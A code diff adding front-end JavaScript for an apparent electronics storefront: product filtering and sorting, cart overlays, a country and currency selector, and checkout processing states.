+            shouldShow = productId.toLowerCase().includes('galaxy');
+        } else if (category === 'audio') {
+            shouldShow = productId.toLowerCase().includes('airpods') ||
+                productId.toLowerCase().includes('jbl');
+        } else if (category === 'accessory') {
+            shouldShow = productId.toLowerCase().includes('protector') ||
+                productId.toLowerCase().includes('cable') ||
+                productId.toLowerCase().includes('powerbank');
+        } else {
+            shouldShow = productCategory === category;
+        }
+
+        if (product && product.style) {
+            product.style.display = shouldShow ? 'block' : 'none';
+        }
+    });
+}
+
+// Sort products
+function sortProducts(sortBy) {
+    const productsContainer = document.querySelector('.products-grid');
+    if (!productsContainer) return;
+
+    const products = Array.from(productsContainer.querySelectorAll('.product-card'));
+
+    products.sort((a, b) => {
+        const priceA = parseFloat(a.querySelector('.current-price').textContent.replace(/[^0-9.]/g, ''));
+        const priceB = parseFloat(b.querySelector('.current-price').textContent.replace(/[^0-9.]/g, ''));
+
+        switch (sortBy) {
+            case 'price-low-high':
+                return priceA - priceB;
+            case 'price-high-low':
+                return priceB - priceA;
+            case 'featured':
+            default:
+                return 0;
+        }
+    });
+
+    products.forEach(product => productsContainer.appendChild(product));
+}
+
+// Prevent multiple initializations
+let scriptInitialized = false;
+
+// Initialize page functionality
+document.addEventListener('DOMContentLoaded', function() {
+    if (scriptInitialized) {
+        return;
+    }
+
+    // Scroll to top of page immediately
+    window.scrollTo(0, 0);
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+
+    scriptInitialized = true;
+
+    try {
+        // Set initial country display
+        const currentFlag = document.getElementById('current-flag');
+        const currentCountryEl = document.getElementById('current-country');
+        const initialConfig = countryConfig[currentCountry];
+
+        if (initialConfig && currentFlag && currentCountryEl) {
+            currentFlag.textContent = initialConfig.flag;
+            currentCountryEl.textContent = initialConfig.name;
+            currentLanguage = initialConfig.lang;
+            updateLanguage(currentLanguage);
+        }
+
+        // Initialize cart
+        updateCartUI();
+
+        // Initialize checkout
+        try {
+            initializeCheckout();
+        } catch (error) {
+            console.error('Error initializing checkout:', error);
+        }
+
+        // Update prices
+        updatePrices();
+
+        // Country dropdown functionality
+        const countryDropdownBtn = document.getElementById('country-dropdown-btn');
+        const countryDropdown = document.getElementById('country-dropdown');
+
+        if (countryDropdownBtn && countryDropdown) {
+            countryDropdownBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                countryDropdown.classList.toggle('hidden');
+            });
+
+            document.addEventListener('click', function(e) {
+                if (!countryDropdownBtn.contains(e.target) && !countryDropdown.contains(e.target)) {
+                    countryDropdown.classList.add('hidden');
+                }
+            });
+
+            // Country selection
+            const countryOptions = document.querySelectorAll('.country-option');
+            countryOptions.forEach(option => {
+                option.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const country = this.getAttribute('data-country');
+                    const config = countryConfig[country];
+
+                    if (config) {
+                        currentCountry = country;
+                        currentLanguage = config.lang;
+                        const currentFlag = document.getElementById('current-flag');
+                        const currentCountryEl = document.getElementById('current-country');
+
+                        if (currentFlag) currentFlag.textContent = config.flag;
+                        if (currentCountryEl) currentCountryEl.textContent = config.name;
+
+                        // Save to localStorage immediately
+                        localStorage.setItem('selectedCountry', country);
+                        localStorage.setItem('selectedLanguage', currentLanguage);
+
+                        // Update language and all prices throughout the page
+                        updateLanguage(currentLanguage);
+
+                        // Force refresh all product prices with new currency
+                        document.querySelectorAll('.current-price').forEach(priceElement => {
+                            const usdPrice = parseFloat(priceElement.getAttribute('data-usd-price'));
+                            if (!isNaN(usdPrice)) {
+                                priceElement.textContent = convertPrice(usdPrice, false);
+                            } else {
+                                // Extract USD price from text and store it
+                                const priceText = priceElement.textContent;
+                                const usdMatch = priceText.match(/Starting from \$(\d+(?:\.\d{2})?)/);
+                                if (usdMatch) {
+                                    const price = parseFloat(usdMatch[1]);
+                                    priceElement.setAttribute('data-usd-price', price);
+                                    priceElement.textContent = `Starting from ${convertPrice(price, false)}`;
+                                }
+                            }
+                        });
+
+                        updatePrices();
+                        updateCartDisplay(); // Refresh cart prices with new currency
+                        updateFooterFromBusinessAddress(); // Update footer contact info
+
+                        // Force refresh of any open checkout modal prices
+                        const checkoutOverlay = document.getElementById('checkout-overlay');
+                        if (checkoutOverlay && checkoutOverlay.classList.contains('active')) {
+                            // Refresh checkout totals
+                            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+                            const checkoutSubtotal = document.getElementById('checkout-subtotal');
+                            const checkoutTotal = document.getElementById('checkout-total');
+                            if (checkoutSubtotal) checkoutSubtotal.textContent = convertPrice(subtotal, false);
+                            if (checkoutTotal) checkoutTotal.textContent = convertPrice(subtotal, false);
+                        }
+
+                        countryDropdown.classList.add('hidden');
+                    }
+                });
+            });
+        }
+
+        // Cart functionality with enhanced event handling
+        const cartButton = document.getElementById('cart-button');
+        const cartOverlay = document.getElementById('cart-overlay');
+        const closeCartButton = document.getElementById('close-cart');
+        const continueShoppingButton = document.getElementById('continue-shopping');
+
+        if (cartButton && cartOverlay) {
+            cartButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                cartOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                return false;
+            });
+        }
+
+        if (closeCartButton) {
+            closeCartButton.addEventListener('click', function() {
+                cartOverlay.classList.remove('active');
+                document.body.style.overflow = '';
+            });
+        }
+
+        if (continueShoppingButton) {
+            continueShoppingButton.addEventListener('click', function() {
+                cartOverlay.classList.remove('active');
+                document.body.style.overflow = '';
+            });
+        }
+
+        if (cartOverlay) {
+            cartOverlay.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
+                    document.body.style.overflow = '';
+                }
+            });
+        }
+
+        // Add to cart event listeners with improved error handling
+        document.addEventListener('click', function(e) {
+            if (e.target.matches('.add-to-cart-btn') || e.target.closest('.add-to-cart-btn')) {
+                e.preventDefault();
+                e.stopPropagation();
+
+                try {
+                    const btn = e.target.matches('.add-to-cart-btn') ? e.target : e.target.closest('.add-to-cart-btn');
+                    const productDataAttr = btn.getAttribute('data-product');
+                    if (productDataAttr) {
+                        const productData = JSON.parse(productDataAttr);
+                        addToCart(productData);
+                    } else {
+                        console.error('No product data found on button');
+                    }
+                } catch (error) {
+                    console.error('Error parsing product data:', error);
+                }
+                return false;
+            }
+        });
+
+        // Prevent any form submissions that might cause page reload
+        document.addEventListener('submit', function(e) {
+            // Only prevent forms within checkout modal
+            if (e.target.closest('.checkout-modal')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Category filter buttons
+        document.addEventListener('click', function(e) {
+            if (e.target.matches('.filter-btn')) {
+                e.preventDefault();
+                try {
+                    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+                    e.target.classList.add('active');
+                    const category = e.target.getAttribute('data-filter');
+                    if (category) {
+                        filterProducts(category);
+                    }
+                } catch (error) {
+                    console.error('Error handling filter click:', error);
+                }
+            }
+        });
+
+        // Sort buttons
+        document.addEventListener('click', function(e) {
+            if (e.target.matches('.sort-btn')) {
+                e.preventDefault();
+                try {
+                    document.querySelectorAll('.sort-btn').forEach(btn => btn.classList.remove('active'));
+                    e.target.classList.add('active');
+                    const sortBy = e.target.getAttribute('data-sort');
+                    if (sortBy) {
+                        sortProducts(sortBy);
+                    }
+                } catch (error) {
+                    console.error('Error handling sort click:', error);
+                }
+            }
+        });
+
+        // Initialize color selections for products
+        initializeColorSelection('iphone15promax', 'iphone15promax-color', 'iphone15promax-image', 'add-to-cart-iphone15promax');
+        initializeColorSelection('iphone16promax', 'iphone16promax-color', 'iphone16promax-image', 'add-to-cart-iphone16promax');
+
+	 // Add checkout button listener with null check
+        const checkoutBtn = document.getElementById('checkout-btn');
+        if (checkoutBtn) {
+            checkoutBtn.addEventListener('click', function() {
+                if (cart.length === 0) {
+                    alert(currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty');
+                    return;
+                }
+
+                createCheckoutModal();
+            });
+        }
+
+        // Remove duplicate event listeners that cause null errors
+        const confirmBankTransferBtn = document.getElementById('confirm-bank-transfer');
+        const processOrderBtn = document.getElementById('process-order');
+        
+        // These buttons don't exist on page load, they're created dynamically in checkout
+        // So we don't need to add listeners here
+
+    } catch (error) {
+        console.error('Error during script initialization:', error);
+    }
+});
+
+function updateCartUI() {
+    updateCartCount();
+    updateCartDisplay();
+}
+
+// Utility functions for cart management
+function getCartSubtotal() {
+    return cart.reduce(function(sum, item) {
+        return sum + (item.price * item.quantity);
+    }, 0);
+}
+
+function formatCurrency(amount) {
+    return convertPrice(amount, false);
+}
+
+// Initialize all functionality when page loads
+function initializePage() {
+    try {
+        updateCartUI();
+        updatePrices();
+        updateLanguage(currentLanguage);
+    } catch (error) {
+        console.error('Error initializing page:', error);
+    }
+}
+
+// Cleanup function
+function cleanup() {
+    // Remove any event listeners if needed
+    const overlay = document.getElementById('checkout-overlay');
+    if (overlay) {
+        overlay.remove();
+    }
+}
+
+// Error handling utility
+function handleError(error, context) {
+    console.error('Error in ' + context + ':', error);
+    if (typeof error === 'object' && error.message) {
+        console.error('Error message:', error.message);
+    }
+}
+
+// Simulate OTP sending for demonstration
+function sendOTPToUser(customerName, customerPhone) {
+    console.log('Simulating OTP sending...');
+    // In a real implementation, this would send an actual OTP
+}
+
+// Initialize on page load
+if (typeof window !== 'undefined') {
+    window.addEventListener('load', function() {
+        // Scroll to top of page
+        window.scrollTo({
+            top: 0,
+            left: 0,
+            behavior: 'auto'
+        });
+        document.body.classList.add('page-load-scroll-top');
+
+        // Initialize page
+        initializePage();
+
+        // Remove scroll class after animation
+        setTimeout(() => {
+            document.body.classList.remove('page-load-scroll-top');
+        }, 200);
+    });
+}
+
+// Additional functions
+function updateFooterInfo() {
+    const phoneElement = document.querySelector('.contact-phone');
+    if (phoneElement) {
+        phoneElement.textContent = countryConfig[currentCountry].phone;
+    }
+}
+
+let currentOrderRef = '';
+
+function generateOrderReference() {
+    currentOrderRef = `ORDER-${Date.now()}`;
+    return currentOrderRef;
+}
+
+function getCartTotal() {
+    return cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+}
+
+// Function to show notification messages
+function showNotification(message, type = 'success') {
+    const notification = document.createElement('div');
+    notification.className = `notification ${type}`;
+    notification.textContent = message;
+    document.body.appendChild(notification);
+
+    // Remove the notification after a few seconds
+    setTimeout(() => {
+        notification.remove();
+    }, 3000);
+}
+
+function showProcessingState() {
+    const bankTransferDetails = document.getElementById('bank-transfer-details');
+    const processingOverlay = document.createElement('div');
+    processingOverlay.className = 'processing-overlay';
+    processingOverlay.innerHTML = `
+        <div class="spinner"></div>
+        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
+    `;
+
+    // Append the overlay directly to the body
+    document.body.appendChild(processingOverlay);
+
+    // Optionally, you might want to disable the confirm button:
+    const confirmButton = document.getElementById('confirm-bank-transfer');
+    if (confirmButton) {
+        confirmButton.disabled = true;
+    }
+}
+
+function showOrderConfirmation() {
+    // Hide processing state
+    const processingOverlay = document.querySelector('.processing-overlay');
+    if (processingOverlay) {
+        processingOverlay.remove();
+    }
+
+    // Re-enable the confirm button:
+    const confirmButton = document.getElementById('confirm-bank-transfer');
+    if (confirmButton) {
+        confirmButton.disabled = false;
+    }
+
+    // Show confirmation message
+    alert(currentLanguage === 'es' ? '¡Pago confirmado! Gracias por su compra.' : 'Payment confirmed! Thank you for your purchase.');
+
+    // Clear cart
+    clearCart();
+
+    // Close checkout modal
+    closeCheckout();
+}
+
+function showCardProcessingState() {
+    const creditCardDetails = document.getElementById('credit-card-details');
+    const processingOverlay = document.createElement('div');
+    processingOverlay.className = 'processing-overlay';
+    processingOverlay.innerHTML = `
+        <div class="spinner"></div>
+        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
+    `;
+
+    // Append the overlay directly to the body
+    document.body.appendChild(processingOverlay);
+
+    // Optionally, you might want to disable the confirm button:
+    const confirmButton = document.getElementById('process-order');
+    if (confirmButton) {
+        confirmButton.disabled = true;
+    }
+}
+ // Removed duplicate place-order event listeners - they're already handled in setupCheckoutEventListeners()
+
+// Remove duplicate event listeners - these are handled in setupCheckoutEventListeners()
+// which is called when the checkout modal is created dynamically
+
+ // These event listeners are already handled in setupCheckoutEventListeners()
+function updateFooterFromBusinessAddress() {
+    const businessAddress = getBusinessAddress();
+    if (!businessAddress) return;
+
+    const fullAddress = `${businessAddress.address}, ${businessAddress.city}, ${businessAddress.country}`;
+    const phoneNumber = businessAddress.phone;
+
+    const footerAddressEl = document.getElementById('footer-address');
+    if (footerAddressEl) {
+        footerAddressEl.innerHTML = `
+            <i class="fas fa-map-marker-alt"></i> ${fullAddress}<br>
+            <i class="fas fa-phone-alt"></i> <a href="tel:${phoneNumber}">${phoneNumber}</a>
+        `;
+    }
+}
+
+
+   
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    updateFooterFromBusinessAddress();
+});
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const countryButtons = document.querySelectorAll('.country-option');
+    
+    countryButtons.forEach(button => {
+        button.addEventListener('click', () => {
+            const newCountry = button.getAttribute('data-country');
+            
+            // Save new country and update global variable
+            localStorage.setItem('selectedCountry', newCountry);
+            currentCountry = newCountry;
+
+            // Optional: update the visible flag and country name in top bar
+            const countryName = button.querySelector('span:nth-child(2)').textContent;
+            const flag = button.querySelector('.flag-icon').textContent;
+
+            document.getElementById('current-country').textContent = countryName;
+            document.getElementById('current-flag').textContent = flag;
+
+            // Close the dropdown (if you have JS for that)
+            document.getElementById('country-dropdown').classList.add('hidden');
+
+            // ✅ Update the footer right away
+            updateFooterFromBusinessAddress();
+        });
+    });
+
+    // ✅ On first page load, update the footer based on saved country
+    const savedCountry = localStorage.getItem('selectedCountry') || 'honduras';
+    currentCountry = savedCountry;
+    updateFooterFromBusinessAddress();
+});
+const form = document.querySelector('form');
+if (form) {
+    form.addEventListener('submit', (event) => {
+        event.preventDefault(); // stop the default form submission (which reloads the page)
+        
+        // your form submit logic here...
+    });
+}
